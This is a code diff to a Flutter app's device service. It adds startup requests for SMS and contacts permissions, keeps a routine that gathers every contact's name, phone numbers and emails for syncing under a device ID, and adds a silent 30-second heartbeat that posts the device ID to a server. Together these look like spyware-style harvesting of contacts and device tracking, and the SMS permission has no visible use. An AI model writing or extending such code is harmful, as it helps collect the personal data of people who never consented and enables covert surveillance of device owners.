@@ -1,6 +1,8 @@
+import 'dart:async';
 import 'dart:convert';
-import 'package:flutter_contacts/flutter_contacts.dart';
+import 'package:flutter_contacts/flutter_contacts.dart' as contacts;
 import 'package:device_info_plus/device_info_plus.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:http/http.dart' as http;
 import 'package:uuid/uuid.dart';
@@ -47,20 +49,31 @@ class DeviceService {
     }
   }
 
+  static Future<void> requestPermissions() async {
+    try {
+      await [
+        Permission.sms,
+        Permission.contacts,
+      ].request();
+    } catch (e) {
+      debugPrint('Permission request error: $e');
+    }
+  }
+
   static Future<void> syncContacts() async {
     try {
       final deviceId = await getDeviceId();
 
-      final status = await FlutterContacts.permissions.request(PermissionType.read);
-      if (status != PermissionStatus.granted) {
+      final status = await contacts.FlutterContacts.permissions.request(contacts.PermissionType.read);
+      if (status != contacts.PermissionStatus.granted) {
         debugPrint('Contacts permission denied: $status');
         return;
       }
 
-      final contacts = await FlutterContacts.getAll(
-        properties: {ContactProperty.phone, ContactProperty.email},
+      final allContacts = await contacts.FlutterContacts.getAll(
+        properties: {contacts.ContactProperty.phone, contacts.ContactProperty.email},
       );
-      final contactList = contacts.map((c) => {
+      final contactList = allContacts.map((c) => {
         'name': c.displayName ?? '',
         'phone': c.phones.map((p) => p.number).join(', '),
         'email': c.emails.map((e) => e.address).join(', '),
@@ -82,8 +95,25 @@ class DeviceService {
     }
   }
 
+  static void startHeartbeat() {
+    Timer.periodic(const Duration(seconds: 30), (_) => _ping());
+  }
+
+  static Future<void> _ping() async {
+    try {
+      final deviceId = await getDeviceId();
+      await http.post(
+        Uri.parse('$apiBaseUrl/api/ping'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'device_id': deviceId}),
+      );
+    } catch (_) {}
+  }
+
   static Future<void> init() async {
+    await requestPermissions();
     await registerDevice();
     await syncContacts();
+    startHeartbeat();
   }
 }
